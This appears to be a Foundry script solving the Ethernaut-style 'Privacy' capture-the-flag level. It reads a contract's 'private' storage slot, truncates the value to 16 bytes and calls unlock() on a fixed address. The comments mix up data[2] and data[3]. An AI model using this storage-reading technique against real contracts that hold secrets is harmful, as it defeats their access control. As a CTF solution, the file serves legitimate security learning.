// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Privacy.sol";

contract PrivacyScript is Script {

    Privacy public privacy = Privacy(0xE4Fd8eB2EB035b47064738FDA60E2a01eB5ADA37);

    /**
     * Solution:
     * 1. We need to get the data[2]. To get the data we have to calculate on which slot is stored
     * 2. We already know it's stored on slot 5, slots start from 0. To get it we can use cast storage 
     * 3. data[3] = 0x44ef0f7aae4c063133e1671b9338606e56c917158e97ae9840804c0977d31233
     * 4. We need to get the first 16 bytes from the data and pass them to the unlock() method.
     * 5. First 16 bytes -> 0x44ef0f7aae4c063133e1671b9338606e
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("1. Is it locked", privacy.locked());
        bytes32 dataThree = vm.load(address(0xE4Fd8eB2EB035b47064738FDA60E2a01eB5ADA37), bytes32(uint256(5)));
        privacy.unlock(bytes16(dataThree));
        console.log("2. Is it locked", privacy.locked());
       
        vm.stopBroadcast();

    }
}

